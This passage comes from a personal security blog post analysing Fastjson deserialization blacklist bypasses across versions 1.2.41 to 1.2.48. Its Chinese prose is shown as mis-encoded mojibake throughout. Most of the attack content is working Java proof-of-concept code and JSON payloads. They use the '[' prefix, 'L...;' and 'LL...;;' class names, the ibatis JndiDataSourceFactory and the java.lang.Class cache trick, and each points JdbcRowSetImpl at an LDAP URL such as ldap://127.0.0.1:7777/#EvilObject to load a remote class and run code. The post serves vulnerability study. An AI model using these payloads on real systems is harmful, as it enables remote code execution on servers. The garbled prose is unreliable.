<p>ä½†æˆ‘ä»¬çš„æ‰€è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»éƒ½æ˜¯åœ¨é»‘åå•é‡Œé¢çš„ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬ç»§ç»­è·Ÿè¿›loadClassçœ‹çœ‹ã€‚å‘ç°loadClassä¸­æœ‰ä¸¤ä¸ªæ£€æµ‹ï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233742373.png" alt="image-20220109233742373" loading="lazy"></p>
<p><strong>å¦‚æœæ˜¯<code>[</code>å¼€å¤´çš„class nameï¼Œå°±å»æ‰<code>[</code>ï¼Œå¹¶è¿”å›ä¸€ä¸ªarrayç±»å‹çš„çš„æ–°å¯¹è±¡</strong></p>
<p><strong>å¦‚æœæ˜¯<code>L</code>å¼€å¤´ã€<code>;</code>ç»“å°¾çš„class nameï¼Œå°±å»æ‰é¦–å°¾ï¼ŒåŠ è½½ä¸­é—´çš„class</strong></p>
<h4 id="æ–¹æ³•ä¸€ï¼šä»¥-å¼€å¤´"><a href="#æ–¹æ³•ä¸€ï¼šä»¥-å¼€å¤´" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä»¥[å¼€å¤´"></a>æ–¹æ³•ä¸€ï¼šä»¥[å¼€å¤´</h4><p>é‚£ä¹ˆæˆ‘ä»¬è¯•è¯•ä»¥<code>[</code>å¼€å¤´</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235030406.png" alt="image-20220109235030406" loading="lazy"></p>
<p>æŒ‰ç…§æç¤ºåœ¨åé¢åŠ ä¸ª<code>[</code>ï¼ŒæŠ¥äº†ä¸€ä¸ªæ–°çš„é”™è¯¯ï¼Œéœ€è¦å†æ·»åŠ ä¸€ä¸ª<code>&#123;</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235105137.png" alt="image-20220109235105137" loading="lazy"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235132417.png" alt="image-20220109235132417" loading="lazy"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> evilStr<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;,\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true&#125;"</span><span class="token punctuation">;</span>
    JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilStr<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨è®¡ç®—å™¨å°±å¯ä»¥æˆåŠŸå¼¹å‡ºäº†ã€‚</p>
<p>è¿™ä¸ªPOCçœ‹èµ·æ¥å®åœ¨å¥‡æ€ªï¼Œfastjsonæ˜¯å¦‚ä½•åŒºåˆ«æ•°ç»„ç±»å‹çš„å‚æ•°çš„ï¼Œä¸ºä½•ä»¥<code>[</code>å¼€å¤´ï¼Œåé¢å°±ä¸€å®šè¦è·Ÿ<code>[&#123;</code>ï¼Œæˆ‘çŒœæµ‹æ˜¯åœ¨æ­£å¸¸æµç¨‹ä¸­ï¼Œfastjsonåšäº†ä¸€äº›å¤„ç†ï¼Œè®©å­—ç¬¦ä¸²ä»¥<code>[</code>å¼€å¤´ï¼Œè¡¨ç¤ºåé¢çš„æ˜¯ä¸€ä¸²æ•°ç»„jsonï¼Œå› æ­¤ä¼šå»å¯»æ‰¾<code>[&#123;</code></p>
<h4 id="æ–¹æ³•äºŒï¼šä»¥Lå¼€å¤´-ç»“å°¾"><a href="#æ–¹æ³•äºŒï¼šä»¥Lå¼€å¤´-ç»“å°¾" class="headerlink" title="æ–¹æ³•äºŒï¼šä»¥Lå¼€å¤´;ç»“å°¾"></a>æ–¹æ³•äºŒï¼šä»¥Lå¼€å¤´;ç»“å°¾</h4><p>å‰é¢æœ‰åˆ†æåˆ°ï¼Œä»¥<code>L</code>å¼€å¤´ï¼Œ<code>;</code>ç»“å°¾çš„class nameä¼šè¢«æˆªå–ä¸­é—´çš„éƒ¨åˆ†ï¼Œç„¶åä¼ å…¥loadClassã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">String</span> newClassName <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>newClassName<span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ä»¥ä¸‹çš„POCï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">String</span> evilStr<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true&#125;"</span><span class="token punctuation">;</span>
    JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilStr<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110124835115.png" alt="image-20220110124835115" loading="lazy"></p>
<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p>
<h3 id="1-2-42ç‰ˆæœ¬å˜åŒ–"><a href="#1-2-42ç‰ˆæœ¬å˜åŒ–" class="headerlink" title="1.2.42ç‰ˆæœ¬å˜åŒ–"></a>1.2.42ç‰ˆæœ¬å˜åŒ–</h3><p>åœ¨ParserConfig#checkAutoType()ä¸­ï¼Œæ£€æµ‹åˆ°<code>L</code>å¼€å¤´<code>;</code>ç»“å°¾çš„classnameï¼Œå°±ä¼šå°†é¦–å°¾å»æ‰ï¼Œç„¶åå†æ”¾å…¥é»‘åå•ä¸­æ£€æŸ¥ã€‚</p>
<p>åŒæ—¶é»‘åå•åšäº†hashåŠ å¯†ï¼Œä½†å› ä¸ºåŠ å¯†æ–¹å¼åœ¨<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>ä¸­èƒ½æ‰¾åˆ°ï¼Œæ‰€ä»¥å¯ä»¥è‡ªå·±å†™è„šæœ¬è¿›è¡Œhashç¢°æ’ã€‚</p>
<p>è¿™é‡Œå·²ç»æœ‰äºº<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">æ•´ç†å‡ºæ¥äº†</a></p>
<h3 id="1-2-42ç»•è¿‡"><a href="#1-2-42ç»•è¿‡" class="headerlink" title="1.2.42ç»•è¿‡"></a>1.2.42ç»•è¿‡</h3><h4 id="æ–¹æ³•ä¸€ï¼šä»¥-å¼€å¤´-1"><a href="#æ–¹æ³•ä¸€ï¼šä»¥-å¼€å¤´-1" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä»¥[å¼€å¤´"></a>æ–¹æ³•ä¸€ï¼šä»¥[å¼€å¤´</h4><p>æ–°ç‰ˆæœ¬å¹¶æœªè€ƒè™‘åˆ°<code>[</code>å¼€å¤´çš„ç»•è¿‡æ–¹å¼ï¼Œæ‰€ä»¥ä¾æ—§å¯ç”¨ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> evilStr<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;,\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true&#125;"</span><span class="token punctuation">;</span>
    JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilStr<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="æ–¹æ³•äºŒï¼šä»¥LLå¼€å¤´-ç»“å°¾"><a href="#æ–¹æ³•äºŒï¼šä»¥LLå¼€å¤´-ç»“å°¾" class="headerlink" title="æ–¹æ³•äºŒï¼šä»¥LLå¼€å¤´;;ç»“å°¾"></a>æ–¹æ³•äºŒï¼šä»¥LLå¼€å¤´;;ç»“å°¾</h4><p>ç»•è¿‡é»‘åå•å…¶å®å¾ˆç®€å•ï¼Œå› ä¸ºæ­¤å¤„åªå¯¹<code>L</code>å’Œ<code>;</code>åšäº†ä¸€æ¬¡æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸¤æ¬¡å°±å¯ä»¥äº†ã€‚</p>
<p>POCå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
    <span class="token class-name">String</span> evilStr<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true&#125;"</span><span class="token punctuation">;</span>

    JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilStr<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è®¡ç®—å™¨æˆåŠŸå¼¹å‡ºï¼š</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134359041.png" alt="image-20220110134359041" loading="lazy"></p>
<h3 id="1-2-43ç‰ˆæœ¬å˜åŒ–åŠç»•è¿‡"><a href="#1-2-43ç‰ˆæœ¬å˜åŒ–åŠç»•è¿‡" class="headerlink" title="1.2.43ç‰ˆæœ¬å˜åŒ–åŠç»•è¿‡"></a>1.2.43ç‰ˆæœ¬å˜åŒ–åŠç»•è¿‡</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134617419.png" alt="image-20220110134617419" loading="lazy"></p>
<p>è¿™é‡Œå¯¹å¤å†™LL;;çš„æ–¹å¼ä¹Ÿåšäº†æ£€æµ‹ï¼Œå› æ­¤ä¸èƒ½å†ä½¿ç”¨è¿™ç§æ–¹å¼ç»•è¿‡äº†ã€‚</p>
<p>ä½†ä»¥<code>[</code>å¼€å¤´çš„æ–¹å¼ä¾ç„¶å¯ä»¥ç»•è¿‡</p>
<p><strong>POC:</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">String</span> evilStr<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;,\"dataSourceName\":\"ldap://127.0.0.1:7777/#EvilObject\",\"autoCommit\":true&#125;"</span><span class="token punctuation">;</span>
    JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilStr<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="1-2-44ç‰ˆæœ¬å˜åŒ–"><a href="#1-2-44ç‰ˆæœ¬å˜åŒ–" class="headerlink" title="1.2.44ç‰ˆæœ¬å˜åŒ–"></a>1.2.44ç‰ˆæœ¬å˜åŒ–</h3><p>åœ¨checkAutoTypeä¸­å¯¹<code>[</code>å¼€å¤´çš„classnameä¹Ÿåšäº†æ£€æµ‹ï¼Œå› æ­¤æˆ‘ä»¬ä¹‹å‰çš„æ–¹æ³•å¤±æ•ˆã€‚</p>
<p>è¿™é‡Œæ‰¾å‡ºäº†æ–°çš„åˆ©ç”¨é“¾ï¼Œä¸”å¹¶ä¸åœ¨é»‘åå•ä¸­ï¼šä½†å¿…é¡»è¦æœ‰éœ€è¦æœ‰ç¬¬ä¸‰æ–¹ç»„ä»¶<strong>ibatis-core 3:0</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token class-name">String</span> evilStr<span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"ldap://localhost:7777/#EvilObject\"&#125;&#125;"</span><span class="token punctuation">;</span>
    JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>evilStr<span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="1-2-25-1-2-47é€šæ€"><a href="#1-2-25-1-2-47é€šæ€" class="headerlink" title="1.2.25 - 1.2.47é€šæ€"></a>1.2.25 - 1.2.47é€šæ€</h3><p>è¿™é‡Œä¸å†è°ƒè¯•äº†ï¼Œå¤§æ¦‚å°±æ˜¯ä¸åœçš„ç»•è¿‡ã€‚</p>
<p>fastjonä¸­æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœå‘ç°æ˜¯Classç±»å‹ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œ<code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>ï¼ŒloadClass()ä¸­å…ˆé€šè¿‡java.lang.Classç»•è¿‡äº†é»‘åå•æ£€æµ‹ï¼Œå¹¶å°†è¯¥Classæ·»åŠ åˆ°äº†mappingä¸­ï¼ˆä¼šåˆ¤æ–­cacheæ˜¯å¦ä¸ºtrueï¼Œé»˜è®¤ä¸ºtrueï¼‰ï¼Œä»è€Œç»•è¿‡äº†autoTypeä¸­çš„æ£€æµ‹ã€‚</p>
<blockquote>
<ul>
<li>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportä¸èƒ½åˆ©ç”¨</li>
<li>1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨</li>
</ul>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
    <span class="token string">"a"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token string">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/badNameClass"</span><span class="token punctuation">,</span>
        <span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="1-2-48ç‰ˆæœ¬å˜åŒ–"><a href="#1-2-48ç‰ˆæœ¬å˜åŒ–" class="headerlink" title="1.2.48ç‰ˆæœ¬å˜åŒ–"></a>1.2.48ç‰ˆæœ¬å˜åŒ–</h3><p>å°†é»˜è®¤cacheè®¾ä¸ºäº†falseï¼Œå°±æ— æ³•å°†classæ”¾å…¥mappingäº†ã€‚</p>
<h2 id="Fastjsonä¸å‡ºç½‘åˆ©ç”¨"><a href="#Fastjsonä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="Fastjsonä¸å‡ºç½‘åˆ©ç”¨"></a>Fastjsonä¸å‡ºç½‘åˆ©ç”¨</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span>TemplatesImpl</span><span class="token comment">//featureéœ€è¦è®¾ä¸ºå…è®¸ç»™épublicå±æ€§èµ‹å€¼</span>
    
<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>dbcp<span class="token punctuation">.</span>dbcp2<span class="token punctuation">.</span></span>BasicDataSource</span><span class="token comment">//éœ€è¦dbcpæˆ–è€…tomcat-dbcpçš„ä¾èµ–å³å¯ï¼ˆdbcpæ˜¯æ•°æ®åº“è¿æ¥æ± ï¼‰</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>dbcpé“¾æš‚æ—¶æ”¾åœ¨ä¹‹åå†åˆ†æã€‚</p>
<h2 id="Reference-8"><a href="#Reference-8" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/xehnw7">Fastjson JdbcRowSetImpl é“¾åŠåç»­æ¼æ´åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8979#toc-0">Fastjson 1.2.22-1.2.24ååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://yyz9.cn/2021/08/07/fastjson%E5%90%84%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">fastjsonå„ä¸ªç‰ˆæœ¬ååºåˆ—åŒ–æ¼æ´åˆ†æ</a></p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Leihehe</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://leihehe.top/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/" title="Javaååºåˆ—åŒ–æ¼æ´ä¹‹åˆ©ç”¨é“¾åˆ†æé›†åˆ(4)">https://leihehe.top/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/" rel="prev" title="Javaååºåˆ—åŒ–æ¼æ´ä¹‹é™æ€ä»£ç†ä¸åŠ¨æ€ä»£ç†(5)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Javaååºåˆ—åŒ–æ¼æ´ä¹‹é™æ€ä»£ç†ä¸åŠ¨æ€ä»£ç†(5)</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90-3/" rel="next" title="Javaååºåˆ—åŒ–æ¼æ´ä¹‹Javaååºåˆ—åŒ–æµç¨‹ä¸åˆ†æ(3)"><span class="post-nav-text">Javaååºåˆ—åŒ–æ¼æ´ä¹‹Javaååºåˆ—åŒ–æµç¨‹ä¸åˆ†æ(3)</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>è¯´ç‚¹ä»€ä¹ˆå¥½å‘¢ï¼Ÿ</span><br></div><style>.utterances {
  max-width: 100%;
}</style><script src="https://utteranc.es/client.js" repo="leihehehe/leihehehe.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 â€“ 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Leihehe</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div id="local-search-result"></div></div></div></body></html>